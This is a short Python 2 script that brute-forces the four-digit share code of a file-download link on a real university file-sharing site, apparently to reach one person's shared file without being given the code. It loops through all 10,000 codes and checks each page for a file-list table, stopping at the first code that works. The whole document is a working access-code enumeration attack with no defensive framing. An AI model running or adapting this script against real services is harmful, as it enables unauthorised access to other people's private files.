#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Mon Jul 10 22:40:40 2017

@author: root
"""

import requests
from bs4 import BeautifulSoup as bs



def get_data(code):
    url_main = "http://my.zju.edu.cn/file/tempDownload.do?nodeId=2810804&t=tempdownload&shareCode="
    url = url_main + str(code)
    
    session = requests.Session()
    req = session.get(url)
    content = req.content
    soup = bs(content, 'html.parser')
    download = soup.find('table', {"id":"fileListTable"})
    try:
        len(download)
        print "True code"
        return code
    except:
        return -1

def try_code():
    for i in xrange(10):
        for j in xrange(10):
            for k in xrange(10):
                for t in xrange(10):
                    code = str(i) + str(j) + str(k) + str(t)
                    print "try " + code  +"...."
                    if (get_data(code)!=-1):
                        return code
                        
        
if __name__ == '__main__':
    try_code()